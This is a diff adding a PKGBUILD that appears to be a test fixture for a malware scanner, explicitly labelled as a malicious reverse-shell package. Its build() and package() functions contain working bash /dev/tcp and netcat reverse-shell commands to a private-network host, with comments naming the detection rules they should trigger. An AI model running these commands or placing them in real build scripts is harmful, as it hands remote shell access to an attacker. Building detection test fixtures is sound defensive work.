@@ -1,0 +1,20 @@
+# Maintainer: Evil Hacker <evil@example.com>
+# This PKGBUILD contains a reverse shell
+
+pkgname=malicious-reverse-shell
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A malicious package with reverse shell"
+arch=('x86_64')
+url="http://192.168.1.100/evil"
+license=('MIT')
+
+build() {
+    # Bash reverse shell - should be detected as SHELL-001
+    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+}
+
+package() {
+    # Netcat reverse shell - should be detected as SHELL-002
+    nc -e /bin/sh 192.168.1.100 4444
+}
